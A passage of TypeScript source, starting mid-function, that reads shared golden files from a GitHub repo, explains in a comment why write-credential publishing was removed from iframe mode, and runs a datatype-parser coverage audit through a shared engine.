      return { ok: true, message: `Read ${count} shared goldens from ${effectiveRepo} (${effectiveBranch}) — no credential needed${note}` };
    }
    if (resp.status === 404) return { ok: false, message: 'Golden index not found — repo/branch may be empty or wrong' };
    return { ok: false, message: `GitHub ${resp.status}${note}` };
  } catch (err) {
    return { ok: false, message: err instanceof Error ? err.message : 'Connection failed' };
  }
}

// REMOVED (build 558): pushGoldensToGitHub. Publishing needs a credential with
// write access, and the iframe has nowhere to keep one that the page itself
// cannot read — so writing is standalone-only and lives in scripts/golden-github.mjs.
// Reading, which is what every install actually needs, requires no credential at all.

// --- Search datatype coverage audit (iframe / client-side) ---
//
// The comparison itself is the SHARED engine in src/datatype-audit.ts, the same
// one the standalone handler runs — there used to be a second implementation
// here, and it had drifted far enough to report different new/changed counts and
// to call every seeded portable-JSON parser "stale" against the same group.
// What differs per mode is only where the store lives: standalone syncs into
// config/datatype-parsers.json on disk, the iframe into a per-install overlay.
export function getBundledDatatypeAudit(
  liveDatatypes: any[],
  group = 'default_search',
  opts: { apply?: boolean; parsers?: Record<string, any> } = {},
): DatatypeAuditResult {
  const bundled = (datatypeParsersData as { parsers: Record<string, any> }).parsers || {};
  return auditDatatypeStore({
    live: liveDatatypes || [],
    parsers: opts.parsers || bundled,
    aliases: ((datatypeFieldAliasesData as any).aliases || {}) as Record<string, string>,
    pickerValues: SOURCETYPES.map(s => s.value),
    group,
    apply: !!opts.apply,
  });
}

